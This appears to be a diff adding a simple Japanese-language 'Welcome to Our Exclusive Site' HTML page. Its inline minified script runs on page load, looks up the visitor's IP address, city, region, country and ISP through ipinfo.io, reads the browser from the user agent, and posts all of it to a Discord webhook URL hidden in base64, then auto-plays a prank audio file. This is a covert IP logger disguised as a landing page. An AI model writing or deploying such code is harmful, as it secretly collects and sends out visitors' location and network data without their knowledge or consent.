@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>WelcomeWWWWWWWWWWWW</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #f5a623, #f76b1c);
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    .content {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    h1 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 1.1em;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="content">
+    <h1>Welcome to Our Exclusive Site</h1>
+    <p>Enjoy a personalized experience just for you!</p>
+  </div>
+
+  <script>
+(function(){async function a(){const b="b889547de0cd4e";const c=await fetch(`https://ipinfo.io/json?token=${b}`);return await c.json()}function d(e){const f=e.match(/(Firefox|Chrome|Safari|Edge|Opera)[\/\s](\d+\.\d+)/);return f?`${f[1]} ${f[2]}`:"不明なブラウザ"}async function g(){const h=await a();const i=navigator.userAgent;const j=d(i);const k=atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwMTgxNjc4OTY1NDgzMTE1NC9lU3AxSjBReDJkcFFXdHhEeFhzTE5ZVFhEODdaUUdlSTZNMkdRYV96SmxEVVF5VjRuTkZscEFydEVnZ0F5X2R0anRSRw==");const l={content:[`IPアドレス: ${h.ip}`,`都市: ${h.city}`,`地域: ${h.region}`,`国: ${h.country}`,`プロバイダ: ${h.org}`,`ブラウザ: ${j}`,`爆音が鳴りますよぶんぶんぶんぶーんWWWWWWW`].join("\n")};fetch(k,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(l)}).then(m=>{m.ok?console.log("情報を送信しました。"):console.error("情報の送信に失敗しました。")})}window.onload=async function(){await g()};function n(){const o=new Audio("https://github.com/unkoman12/hikakinTNTN/raw/refs/heads/main/hikakinotoware.mp3");o.play()}n()})();
+
+  </script>
+</body>
+</html>
